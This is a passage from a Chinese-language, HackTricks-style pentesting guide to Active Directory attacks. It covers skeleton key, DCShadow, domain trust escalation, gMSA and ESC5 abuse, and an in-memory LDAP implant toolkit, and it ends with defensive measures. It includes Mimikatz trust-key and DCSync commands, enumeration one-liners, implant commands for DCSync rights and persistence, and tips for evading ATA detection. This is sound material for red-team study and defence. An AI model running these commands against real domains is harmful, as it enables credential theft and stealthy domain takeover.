在内存中修改 **LSASS** 以建立一个**通用密码**，从而获得对所有域账户的访问权。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[了解 SSP (Security Support Provider) 的含义请见此处。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建你自己的 **SSP** 来**以明文抓取**用于访问机器的**凭证**。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它会在 AD 中注册一个**新的 Domain Controller**并使用它来**推送属性**（如 SIDHistory、SPNs...）到指定对象，且不会留下有关这些**修改**的任何**日志**。你需要 DA 权限并位于**根域**内。\
注意如果你使用了错误的数据，会出现相当难看的日志痕迹。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

之前我们讨论了如果你有**足够权限读取 LAPS 密码**，如何提升权限。然而，这些密码也可以用于**维持持久化**。\
参见：


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着**攻破单一域可能最终导致整个 Forest 被攻破**。

### Basic Information

A [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，允许来自一个**域**的用户访问另一个**域**中的资源。它本质上在两个域的身份验证系统之间创建了一个链接，使身份验证校验可以无缝流动。当域建立信任时，它们在各自的 **Domain Controllers (DCs)** 中交换并保留特定的**密钥**，这些密钥对信任的完整性至关重要。

在典型场景中，如果用户打算访问**受信域**中的服务，他们必须先从自己域的 DC 请求一个特殊票证，称为 **inter-realm TGT**。该 TGT 使用两个域为信任关系约定的共享**密钥**进行加密。用户随后将该 TGT 提交给**受信域的 DC**以获取服务票证（**TGS**）。受信域的 DC 验证 inter-realm TGT 后，如果有效，就会颁发 TGS，从而授予用户对该服务的访问权限。

**步骤**：

1. **Domain 1** 中的**客户端计算机**使用其 **NTLM hash** 向其 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)**，启动流程。
2. 如果客户端验证成功，DC1 会颁发一个新的 TGT。
3. 客户端随后向 DC1 请求一个 **inter-realm TGT**，以便访问 **Domain 2** 的资源。
4. inter-realm TGT 使用 DC1 和 DC2 之间的 **trust key** 加密，作为双向域信任的一部分。
5. 客户端将 inter-realm TGT 带到 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用其共享的 trust key 验证 inter-realm TGT，如果验证通过，则为客户端想访问的 Domain 2 中的服务器颁发 **Ticket Granting Service (TGS)**。
7. 最后，客户端将该 TGS 提交给服务器，该 TGS 使用服务器账户 hash 加密，以获取对 Domain 2 中服务的访问权限。

### Different trusts

需要注意的是，**信任可以是单向或双向的**。在双向选项中，两个域将互相信任；而在**单向**信任关系中，一个域为**trusted**，另一个为**trusting**。在这种情况下，**你只能从 trusted 域访问 trusting 域内的资源**。

如果 Domain A 信任 Domain B，则 A 为 trusting 域，B 为 trusted 域。此外，在 **Domain A** 中，这将是一个 **Outbound trust**；在 **Domain B** 中，这将是一个 **Inbound trust**。

**Different trusting relationships**

- **Parent-Child Trusts**：这是同一 forest 内常见的设置，子域自动与其父域形成双向可传递信任。实质上，这意味着父域与子域之间的身份验证请求可以无缝流动。
- **Cross-link Trusts**：称为“shortcut trusts”，在子域之间建立以加速引用过程。在复杂的 forest 中，身份验证引用通常必须上到 forest 根然后再下到目标域。通过创建 cross-links，可以缩短这一旅程，这在地理分散的环境中特别有用。
- **External Trusts**：这些信任在不同且无关联的域之间建立，且具备非传递性。根据 [Microsoft 的文档](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 有助于访问当前 forest 之外且未通过 forest trust 连接的域中的资源。通过 SID 过滤可以增强 external trusts 的安全性。
- **Tree-root Trusts**：这些信任在 forest 根域与新添加的 tree root 之间自动建立。虽然不常见，但 tree-root trusts 对向 forest 添加新的域树很重要，允许它们保留唯一域名并确保双向传递性。更多信息见 [Microsoft 指南](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：这类信任是两个 forest 根域之间的双向传递信任，同时执行 SID 过滤以增强安全措施。
- **MIT Trusts**：这些信任与非 Windows 的、符合 [RFC4120](https://tools.ietf.org/html/rfc4120) 的 Kerberos 域建立。MIT trusts 更加专业化，适用于需要与 Windows 生态之外基于 Kerberos 的系统集成的环境。

#### Other differences in **trusting relationships**

- 信任关系也可以是**传递性**的（A 信任 B，B 信任 C，则 A 信任 C）或**非传递性**的。
- 信任关系可以设置为**双向信任**（双方互相信任）或**单向信任**（仅一方信任另一方）。

### Attack Path

1. **Enumerate** 信任关系
2. 检查是否有任何 **security principal**（用户/组/计算机）对**另一个域**的资源拥有**访问**，可能通过 ACE 条目或成为另一个域的组成员来体现。寻找跨域关系（信任很可能就是为此而创建）。
1. 在这种情况下，kerberoast 也可能是另一种选择。
3. **Compromise** 可以**pivot** 跨域的**账户**。

攻击者可以通过三种主要机制访问另一个域的资源：

- **Local Group Membership**：主体可能被添加到机器上的本地组，例如服务器上的“Administrators”组，从而获得对该机器的重大控制权。
- **Foreign Domain Group Membership**：主体也可能成为外域组的成员。然而，此方法的有效性取决于信任的性质和组的范围。
- **Access Control Lists (ACLs)**：主体可能被列在 **ACL** 中，尤其是作为 **DACL** 中 **ACE** 的实体，从而对特定资源拥有访问权限。想深入了解 ACL、DACL 和 ACE 工作机制的人，可参考白皮书 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 。

### Find external users/groups with permissions

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** 来查找域中的外部安全主体。这些将是来自**外部域/forest**的用户/组。

你可以在 **Bloodhound** 中检查或使用 powerview：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
枚举域信任的其他方法：
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 有 **2 个 trusted keys**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_.\
> 你可以使用以下命令查看当前域使用的那个：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

以 Enterprise admin 身份滥用信任和 SID-History injection 来提升到 child/parent 域：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

理解如何滥用 Configuration NC 很关键。Configuration NC 是 Active Directory (AD) 环境中跨林的配置数据中央存储。此数据会复制到林内的每个 Domain Controller (DC)，可写的 DC 会保留 Configuration NC 的可写副本。要利用这一点，必须在 DC 上拥有 **SYSTEM 权限**，最好是在 child DC 上。

**Link GPO to root DC site**

Configuration NC 的 Sites 容器包含了 AD 林中所有加入域的计算机的站点信息。通过在任意 DC 上以 SYSTEM 权限操作，攻击者可以将 GPO 链接到 root DC sites。此操作可能通过操纵应用于这些站点的策略来破坏 root domain。

有关详细信息，可参考研究 [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research)。

**Compromise any gMSA in the forest**

一个攻击向量是针对域内特权 gMSA。用于计算 gMSA 密码的 KDS Root key 存储在 Configuration NC 中。只要在任意 DC 上拥有 SYSTEM 权限，就可以访问 KDS Root key 并计算出林内任意 gMSA 的密码。

详细分析和分步指南见：


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

补充的委派 MSA 攻击（BadSuccessor – 滥用 migration attributes）：


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

额外外部研究： [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent)。

**Schema change attack**

此方法需要耐心，等待创建新的特权 AD 对象。在拥有 SYSTEM 权限的情况下，攻击者可以修改 AD Schema，授予任何用户对所有类的完全控制。这可能导致对新创建 AD 对象的未授权访问和控制。

更多阅读见 [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent)。

**From DA to EA with ADCS ESC5**

ADCS ESC5 漏洞针对对 PKI 对象的控制，以创建允许在林内以任何用户身份进行认证的证书模板。由于 PKI 对象位于 Configuration NC，攻陷一个可写的 child DC 可以执行 ESC5 攻击。

更多细节见 [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c)。在没有 ADCS 的场景中，攻击者也可以自行搭建所需组件，参见 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在此情景中，**你的域被一个外部域所信任**，并授予你对其**不确定的权限**。你需要找出**你域中的哪些主体对外部域拥有哪些访问权限**，然后尝试利用它：

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部林域 - 单向（出站）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
在此情景中，**你的域** 正在将一些 **权限** 信任（授予）来自 **不同域** 的主体。

然而，当**域被信任**时，受信域**创建一个用户**，该用户具有**可预测的名称**，并使用**受信密码作为密码**。这意味着可以**访问来自信任域的用户以进入受信域**，对其进行枚举并尝试提升更多权限：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一个危及受信域的方法是找到在域信任的**相反方向**创建的[**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这并不常见）。

另一种危及受信域的方法是在一台机器上等待一个**来自受信域的用户可以访问**并通过 **RDP** 登录。然后，攻击者可以在 RDP 会话进程中注入代码，并从那里**访问受害者的原始域**。此外，如果**受害者挂载了他的硬盘**，攻击者可以从**RDP 会话**进程将 **backdoors** 存放到硬盘的**启动文件夹**中。此技术称为 **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### 域信任滥用缓解

### **SID Filtering:**

- 利用 SID history 属性跨 forest trusts 的攻击风险可通过 **SID Filtering** 缓解，SID Filtering 在所有 inter-forest trusts 上默认启用。其前提是假设 intra-forest trusts 是安全的，将 forest（而非 domain）视为安全边界，这是 Microsoft 的立场。
- 不过，有个问题：**SID Filtering** 可能会中断应用程序和用户访问，因此有时会被禁用。

### **Selective Authentication:**

- 对于 inter-forest trusts，采用 **Selective Authentication** 可确保来自两个 forest 的用户不会被自动认证。相反，用户需要被明确授予权限，才能访问 trusting domain 或 trusting forest 内的域和服务器。
- 需要注意的是，这些措施无法防止对可写的 Configuration Naming Context (NC) 的利用，或对 trust account 的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## 基于 LDAP 的来自本地主机植入程序的 AD 滥用

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD 风格的 LDAP 原语重新实现为 x64 Beacon Object Files，完全在 on-host implant（例如 Adaptix C2）内运行。操作人员使用 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 来编译该包，加载 `ldap.axs`，然后从 beacon 中调用 `ldap <subcommand>`。所有流量均使用当前登录的安全上下文通过 LDAP (389)（带 signing/sealing）或 LDAPS (636)（带自动证书信任）传输，因此不需要 socks 代理或磁盘痕迹。

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, and `get-groupmembers` 将短名/OU 路径解析为完整的 DNs 并转储相应对象。
- `get-object`, `get-attribute`, and `get-domaininfo` 拉取任意属性（包括 security descriptors）以及来自 `rootDSE` 的 forest/domain 元数据。
- `get-uac`, `get-spn`, `get-delegation`, and `get-rbcd` 直接从 LDAP 暴露 roasting candidates、delegation 设置和现有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) 描述符。
- `get-acl` and `get-writable --detailed` 解析 DACL，列出 trustees、权限（GenericAll/WriteDACL/WriteOwner/attribute writes）和继承信息，为 ACL 提权提供直接目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP 写入原语用于提升权限与持久化

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) 允许操作者在存在 OU 权限的任意位置部署新的 principals 或机器账户。`add-groupmember`、`set-password`、`add-attribute` 和 `set-attribute` 一旦获得 write-property 权限即可直接劫持目标。
- 以 ACL 为中心的命令，例如 `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite` 和 `add-dcsync` 将任何 AD 对象上的 WriteDACL/WriteOwner 转换为密码重置、组成员控制或 DCSync 复制权限，而不会留下 PowerShell/ADSI 痕迹。对应的 `remove-*` 命令可清理注入的 ACEs。

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` 可立即使被攻陷用户变为 Kerberoastable；`add-asreproastable`（UAC 切换）在不触及密码的情况下将其标记为可进行 AS-REP roasting。
- Delegation 宏（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）可从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC 标志或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，启用 constrained/unconstrained/RBCD 攻击路径，并消除对远程 PowerShell 或 RSAT 的需求。

### sidHistory 注入、OU 迁移与攻击面塑造

- `add-sidhistory` 将特权 SID 注入受控主体的 SID history（参见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 提供隐蔽的访问继承。
- `move-object` 更改计算机或用户的 DN/OU，使攻击者能够在滥用 `set-password`、`add-groupmember` 或 `add-spn` 之前将资产拖到已有委派权限的 OU 中。
- 精细作用域的移除命令（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` 等）允许在操作者收集凭据或建立持久化后快速回滚，最小化遥测。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: 建议仅允许 Domain Admins 登录到 Domain Controllers，避免在其他主机上使用。
- **Service Account Privileges**: 服务不应以 Domain Admin (DA) 权限运行，以维持安全性。
- **Temporal Privilege Limitation**: 对于需要 DA 权限的任务，应限制其持续时间。可通过以下方式实现： `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: 审计 Event IDs 2889/3074/3075，然后在 DCs/clients 上强制启用 LDAP signing 以及 LDAPS channel binding，以阻止 LDAP MITM/relay 尝试。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- 实施欺骗包括设置陷阱，例如诱饵用户或计算机，具有不过期的密码或被标记为 Trusted for Delegation 等特性。详细方法包括创建具有特定权限的用户或将其添加到高权限组中。
- 一个实用示例涉及使用如下工具： `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 有关部署欺骗技术的更多信息，请参见 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)。

### **Identifying Deception**

- **For User Objects**: 可疑指示包括异常的 ObjectSID、不频繁的登录、创建日期以及较低的坏密码计数。
- **General Indicators**: 将潜在诱饵对象的属性与真实对象进行比较可以发现不一致之处。像 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 这样的工具可以帮助识别此类欺骗。

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: 避免在 Domain Controllers 上进行会话枚举以防止触发 ATA 检测。
- **Ticket Impersonation**: 使用 **aes** 密钥创建票证有助于规避检测，因为不会降级到 NTLM。
- **DCSync Attacks**: 建议从非 Domain Controller 上执行以避免 ATA 检测，因为直接从 Domain Controller 执行会触发告警。

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

{{#include ../../banners/hacktricks-training.md}}
